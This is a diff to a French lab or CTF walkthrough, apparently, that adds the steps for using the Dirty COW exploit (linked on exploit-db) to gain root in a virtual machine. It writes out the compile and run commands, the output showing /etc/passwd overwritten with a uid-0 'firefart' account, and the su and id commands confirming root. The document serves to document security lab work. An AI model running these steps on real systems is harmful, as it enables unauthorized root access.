@@ -184,7 +184,23 @@ An unprivileged local user could use this flaw to gain write access to otherwise
 
 De nombreux codes existent sur internet afin de profiter de cette vulnérabilité, et nous avons choisi d'utiliser [ce code](https://www.exploit-db.com/exploits/40839), présent dans le dossier scripts, qui modifie le nom de connexion à root et change son password.
 
-On ouvre donc un editeur de code (tel que vim) dans la VM, et on sauvegarde le code du dirty cow dans un fichier .c, à compiler avec la commande `gcc -pthread dirty.c -lcrypt`.
+On ouvre donc un editeur de code (tel que vim) dans la VM, et on sauvegarde le code du dirty cow dans un fichier .c.
 
-- `dirty.c passwd`
-On peut ensuite suivre les instructions du programme, puis se connecter avec les credentials appropriés sur la VM.
+- `gcc -pthread dirty.c -lcrypt`.
+- `./a.out passwd`
+  ```shell
+    /etc/passwd successfully backed up to /tmp/passwd.bak
+    Please enter the new password: passwd
+    Complete line:
+    firefart:fijDIKjQYAYgU:0:0:pwned:/root:/bin/bash
+
+    mmap: b7fda000
+
+    ^C
+  ```
+- `su firefart`
+  - `passwd`
+- `id`
+  ```shell
+    uid=0(firefart) gid=0(root) groups=0(root)
+  ```
